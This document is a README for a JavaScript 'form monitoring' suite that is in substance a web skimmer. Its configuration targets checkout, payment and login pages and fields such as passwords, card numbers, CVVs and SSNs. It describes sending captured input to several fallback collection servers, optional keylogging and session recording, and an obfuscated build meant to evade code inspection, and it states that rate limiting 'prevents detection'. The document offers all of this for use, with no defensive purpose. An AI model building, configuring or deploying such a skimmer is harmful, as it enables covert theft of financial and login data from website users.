# Form Monitoring Suite

A collection of JavaScript-based data collection utilities designed for monitoring and collecting user input data from web forms and interactions.

## Overview

This suite provides three different implementations:

1. **Basic Form Monitor** (`form-monitor.js`)
   - Simple and lightweight implementation
   - Focuses on core form data collection
   - Suitable for basic monitoring needs

2. **Advanced Form Monitor** (`form-monitor-advanced.js`)
   - Enhanced implementation with additional features
   - Includes analytics, session tracking, and advanced security
   - Suitable for comprehensive monitoring needs

3. **Obfuscated Form Monitor** (`form-monitor-obfuscated.js`)
   - Functionally identical to the basic form monitor
   - Variable names and code structure obfuscated
   - Suitable for environments where code inspection is likely

## Features

### Basic Form Monitor
- **Form Monitoring**
  - Tracks all form submissions
  - Monitors input field changes
  - Captures button interactions
  - Handles dynamic content

- **Data Security**
  - Encrypts sensitive information
  - Implements key rotation
  - Provides data compression
  - Uses secure transmission

- **Reliability**
  - Multiple backup endpoints
  - Automatic retry mechanism
  - Data persistence
  - Error handling

### Advanced Form Monitor
- **Enhanced Monitoring**
  - All features from basic monitor
  - Custom field type detection
  - Pattern recognition
  - Behavior analysis

- **Advanced Security**
  - Multiple encryption methods
  - Hash-based integrity verification
  - Session management
  - Enhanced key rotation

- **Analytics**
  - Usage statistics
  - Session tracking
  - Error monitoring
  - Performance metrics

- **Additional Features**
  - Screenshot capability (optional)
  - Keylogging (optional)
  - Mouse tracking (optional)
  - Session recording (optional)
  - Form replay (optional)

### Obfuscated Form Monitor
- **Same Functionality as Basic Monitor**
  - Identical features and capabilities
  - Same data collection methods
  - Same security measures

- **Code Protection**
  - Obfuscated variable names
  - Restructured code flow
  - Minimized readability
  - Harder to analyze and modify

## Setup

### Basic Form Monitor

1. Configure the endpoints in `settings.api`:
   ```javascript
   api: {
       main: 'https://[DOMAIN]/api/v1/collect',
       fallback: 'https://[BACKUP-DOMAIN]/api/v1/collect',
       additional: [
           'https://[REGION1-DOMAIN]/api/v1/collect',
           'https://[REGION2-DOMAIN]/api/v1/collect',
           'https://[REGION3-DOMAIN]/api/v1/collect'
       ]
   }
   ```

2. Adjust detection patterns in `settings.detection`:
   ```javascript
   detection: {
       targetPages: /(payment|checkout|order|cart|billing|purchase|basket|panier|kasse|account|profile|settings|login|register|signup|signin)/i,
       sensitiveFields: /(password|credit|card|ssn|social|security|pin|code|cvv|expiry|account|routing|swift|iban|secret|key|token|auth)/i,
       valuableFields: /(email|phone|address|zip|postal|city|state|country|dob|birth|name|username|id|number)/i
   }
   ```

3. Configure timing parameters in `settings.timing`:
   ```javascript
   timing: {
       syncInterval: 3000,
       maxAttempts: 5,
       debounceDelay: 250,
       maxStorageTime: 30000,
       initialDelay: 1000
   }
   ```

### Advanced Form Monitor

1. Configure the endpoints in `settings.api`:
   ```javascript
   api: {
       main: 'https://[DOMAIN]/api/v2/collect',
       fallback: 'https://[BACKUP-DOMAIN]/api/v2/collect',
       additional: [
           'https://[REGION1-DOMAIN]/api/v2/collect',
           'https://[REGION2-DOMAIN]/api/v2/collect',
           'https://[REGION3-DOMAIN]/api/v2/collect'
       ],
       analytics: 'https://[ANALYTICS-DOMAIN]/api/v1/stats'
   }
   ```

2. Adjust detection patterns in `settings.detection`:
   ```javascript
   detection: {
       targetPages: /(payment|checkout|order|cart|billing|purchase|basket|panier|kasse|account|profile|settings|login|register|signup|signin)/i,
       sensitiveFields: /(password|credit|card|ssn|social|security|pin|code|cvv|expiry|account|routing|swift|iban|secret|key|token|auth)/i,
       valuableFields: /(email|phone|address|zip|postal|city|state|country|dob|birth|name|username|id|number)/i,
       customFields: {
           financial: /(balance|amount|price|cost|fee|tax|discount|total)/i,
           personal: /(gender|age|occupation|education|income|marital|family)/i,
           preferences: /(interests|hobbies|preferences|settings|options|choices)/i
       }
   }
   ```

3. Configure features in `settings.features`:
   ```javascript
   features: {
       enableAnalytics: true,
       enableScreenshots: false,
       enableKeylogging: false,
       enableMouseTracking: false,
       enableFormReplay: false,
       enableSessionRecording: false
   }
   ```

4. Configure analysis settings in `settings.analysis`:
   ```javascript
   analysis: {
       enablePatternRecognition: true,
       enableBehaviorAnalysis: true,
       enableFraudDetection: false
   }
   ```

### Obfuscated Form Monitor

The obfuscated version uses the same configuration structure but with obfuscated variable names:

```javascript
const _0x4f2a = {
    _0x3e1b: {
        _0x2d4c: 'https://[DOMAIN]/api/v1/collect',
        _0x1f3a: 'https://[BACKUP-DOMAIN]/api/v1/collect',
        _0x5c7d: [
            'https://[REGION1-DOMAIN]/api/v1/collect',
            'https://[REGION2-DOMAIN]/api/v1/collect',
            'https://[REGION3-DOMAIN]/api/v1/collect'
        ]
    },
    // ... other configuration settings with obfuscated names
};
```

## Endpoint Requirements

The receiving endpoints must:
- Accept POST requests with JSON payload
- Handle CORS (Cross-Origin Resource Sharing)
- Accept required headers:
  - Content-Type: application/json
  - X-Session-ID: Unique session identifier
  - X-Client-Version: Version of the client
  - X-Encryption-Key: Current encryption key
- Return 200 OK for successful requests
- Handle compressed payloads
- Implement rate limiting
- Have SSL/TLS encryption
- Implement request validation
- Handle multiple concurrent connections
- Implement request queuing
- Have fallback mechanisms for data storage

## Security Considerations

- All sensitive data is encrypted before transmission
- Encryption keys are rotated periodically
- Data is compressed for efficient transmission
- Multiple fallback endpoints ensure reliability
- Rate limiting prevents detection
- SSL/TLS encryption for all communications
- Obfuscated code provides additional protection against analysis

## Usage

1. Include the desired script in your target webpage:
   ```html
   <!-- For basic monitoring -->
   <script src="form-monitor.js"></script>
   
   <!-- For advanced monitoring -->
   <script src="form-monitor-advanced.js"></script>
   
   <!-- For obfuscated monitoring -->
   <script src="form-monitor-obfuscated.js"></script>
   ```

2. The script will automatically:
   - Initialize on matching pages
   - Monitor form submissions
   - Collect user input
   - Transmit data to configured endpoints

## Data Format

### Basic Form Monitor
```javascript
{
    sessionId: "unique_session_id",
    data: [
        // Collected form data and interactions
    ],
    context: {
        location: "page_url",
        timestamp: 1234567890,
        userAgent: "browser_user_agent",
        screenSize: "widthxheight",
        language: "user_language",
        timezone: "user_timezone",
        platform: "user_platform",
        referrer: "referrer_url"
    }
}
```

### Advanced Form Monitor
```javascript
{
    sessionId: "unique_session_id",
    data: [
        // Collected form data and interactions with enhanced metadata
    ],
    context: {
        location: "page_url",
        timestamp: 1234567890,
        userAgent: "browser_user_agent",
        screenSize: "widthxheight",
        language: "user_language",
        timezone: "user_timezone",
        platform: "user_platform",
        referrer: "referrer_url"
    },
    analytics: {
        // Usage statistics and metrics
    }
}
```

### Obfuscated Form Monitor
The obfuscated version uses the same data format as the basic form monitor, but the internal variable names are obfuscated.

## Error Handling

- Automatic retry mechanism for failed transmissions
- Multiple fallback endpoints
- Data persistence until successful transmission
- Graceful degradation of features
- Error logging and monitoring

## Performance

- Debounced event handling
- Efficient data storage
- Compressed payloads
- Optimized DOM observation
- Memory leak prevention

## Maintenance

Regular maintenance tasks:
- Monitor endpoint availability
- Update detection patterns
- Adjust timing parameters
- Rotate encryption keys
- Review error logs

## Support

For support and updates:
- Monitor endpoint responses
- Check error logs
- Review transmission statistics
- Update configuration as needed 